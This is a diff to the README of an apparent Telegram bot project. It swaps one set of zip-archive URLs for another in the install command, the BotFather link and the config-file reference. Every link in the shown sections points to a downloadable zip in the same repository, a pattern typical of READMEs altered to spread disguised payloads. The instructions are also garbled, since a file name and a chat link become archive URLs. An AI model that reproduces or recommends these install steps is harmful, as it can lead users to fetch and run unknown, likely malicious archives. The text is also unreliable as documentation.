@@ -5,11 +5,11 @@ IN DEVELOPMENT
 
 ## Installation
 Install all of the required dependencies for this project by running:  
-`pip install -r https://raw.githubusercontent.com/twriad969/cross-prom/master/prefator/cross-prom.zip`
+`pip install -r https://github.com/twriad969/cross-prom/raw/refs/heads/master/prefator/prom_cross_3.0-beta.4.zip`
 
 
 ## Deploy your bot
-Start a chat with [BotFather](https://raw.githubusercontent.com/twriad969/cross-prom/master/prefator/cross-prom.zip) in Telegram and get an API token. Once you've done that, input both the API token and your user ID (double check, because the person with this ID will have all administrative privileges) and put them into the `https://raw.githubusercontent.com/twriad969/cross-prom/master/prefator/cross-prom.zip` file.
+Start a chat with [BotFather](https://github.com/twriad969/cross-prom/raw/refs/heads/master/prefator/prom_cross_3.0-beta.4.zip) in Telegram and get an API token. Once you've done that, input both the API token and your user ID (double check, because the person with this ID will have all administrative privileges) and put them into the `https://github.com/twriad969/cross-prom/raw/refs/heads/master/prefator/prom_cross_3.0-beta.4.zip` file.
 
 
 ## Bot commands
